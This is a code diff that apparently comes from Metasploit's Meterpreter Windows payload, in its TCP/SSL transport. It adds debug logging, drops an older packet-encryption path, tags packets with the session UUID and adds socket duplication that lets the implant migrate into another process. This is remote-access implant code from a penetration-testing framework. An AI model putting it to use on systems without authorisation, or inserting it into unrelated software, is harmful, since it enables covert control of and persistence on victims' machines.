@@ -5,6 +5,13 @@
 #include "../../common/common.h"
 #include <ws2tcpip.h>
 
+// TCP-transport specific migration stub.
+typedef struct _TCPMIGRATECONTEXT
+{
+	COMMONMIGRATCONTEXT common;
+	WSAPROTOCOL_INFOA info;
+} TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;
+
 // These fields aren't defined unless the SDK version is set to something old enough.
 // So we define them here instead of dancing with SDK versions, allowing us to move on
 // and still support older versions of Windows.
@@ -466,8 +473,10 @@ static BOOL server_destroy_ssl(Transport* transport)
 
 	lock_acquire(transport->lock);
 
+	dprintf("[SERVER] Freeing ssl %p", ctx->ssl);
 	SSL_free(ctx->ssl);
 
+	dprintf("[SERVER] Freeing context %p", ctx->ctx);
 	SSL_CTX_free(ctx->ctx);
 
 	CRYPTO_set_locking_callback(NULL);
@@ -476,14 +485,18 @@ static BOOL server_destroy_ssl(Transport* transport)
 	CRYPTO_set_dynlock_lock_callback(NULL);
 	CRYPTO_set_dynlock_destroy_callback(NULL);
 
+	dprintf("[SERVER] Destroying locks");
 	for (i = 0; i < CRYPTO_num_locks(); i++)
 	{
 		lock_destroy(ssl_locks[i]);
 	}
 
+	dprintf("[SERVER] Freeing locks %p", ssl_locks);
 	free(ssl_locks);
 
 	lock_release(transport->lock);
+
+	dprintf("[SERVER] Finished destroying SSL");
 
 	return TRUE;
 }
@@ -511,6 +524,7 @@ static BOOL server_negotiate_ssl(Transport* transport)
 		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
 
 		ctx->ssl = SSL_new(ctx->ctx);
+		dprintf("[SERVER] SSL = %p", ctx->ssl);
 		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
 
 		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
@@ -570,7 +584,6 @@ static BOOL server_negotiate_ssl(Transport* transport)
 static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 {
 	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
-	CryptoContext *crypto = NULL;
 	Packet *localPacket = NULL;
 	PacketHeader header;
 	LONG bytesRead;
@@ -685,26 +698,6 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 
 		memset(localPacket, 0, sizeof(Packet));
         dprintf("[PACKET RECEIVE DNS] copy %d",payloadLength);
-		// If the connection has an established cipher and this packet is not
-		// plaintext, decrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = payloadLength;
-			PUCHAR origPayload = payload;
-
-			// Decrypt
-			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// We no longer need the encrypted payload
-			free(origPayload);
-		}
-
 		localPacket->header.length = header.length;
 		localPacket->header.type = header.type;
 		localPacket->payload = payload;
@@ -1008,7 +1001,6 @@ static BOOL configure_tcp_connection(Transport* transport)
  */
 DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
 {
-	CryptoContext* crypto;
 	Tlv requestId;
 	DWORD res;
 	DWORD idx;
@@ -1034,6 +1026,9 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
 	}
 
+	// Always add the UUID to the packet as well, so that MSF knows who and what we are
+  	packet_add_tlv_raw(packet, TLV_TYPE_UUID, remote->orig_config->session.uuid, UUID_SIZE);
+
 	do
 	{
 		// If a completion routine was supplied and the packet has a request
@@ -1043,32 +1038,6 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 			&requestId) == ERROR_SUCCESS))
 		{
 			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		// If the endpoint has a cipher established and this is not a plaintext
-		// packet, we encrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = packet->payloadLength;
-			PUCHAR origPayload = packet->payload;
-
-			// Encrypt
-			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
-				packet->payloadLength, &packet->payload,
-				&packet->payloadLength)) !=
-				ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// Destroy the original payload as we no longer need it
-			free(origPayload);
-
-			// Update the header length
-			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
 		}
 
 		dprintf("[PACKET] New xor key for sending");
@@ -1157,6 +1126,37 @@ void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config
 }
 
 /*!
+ * @brief Create a migration context that is specific to this transport type.
+ * @param transport Transport data to create the configuration from.
+ * @param targetProcessId ID of the process that we will be migrating into.
+ * @param targetProcessHandle Handle to the target process.
+ * @param contextSize Buffer that will receive the size of the generated context.
+ * @param contextBufer Buffer that will receive the generated context.
+ * @return Indication of success or failure.
+ */
+static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, LPBYTE* contextBuffer)
+{
+	LPTCPMIGRATECONTEXT ctx = (LPTCPMIGRATECONTEXT)calloc(1, sizeof(TCPMIGRATECONTEXT));
+
+	if (ctx == NULL)
+	{
+		return ERROR_OUTOFMEMORY;
+	}
+
+	// Duplicate the socket for the target process if we are SSL based
+	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
+	{
+		free(ctx);
+		return WSAGetLastError();
+	}
+
+	*contextSize = sizeof(TCPMIGRATECONTEXT);
+	*contextBuffer = (PBYTE)ctx;
+
+	return ERROR_SUCCESS;
+}
+
+/*!
  * @brief Creates a new TCP transport instance.
  * @param config The TCP configuration block.
  * @return Pointer to the newly configured/created TCP transport instance.
@@ -1185,7 +1185,7 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config)
 	transport->get_socket = transport_get_socket_tcp;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
+	transport->get_migrate_context = get_migrate_context_tcp;
 
 	return transport;
 }
-
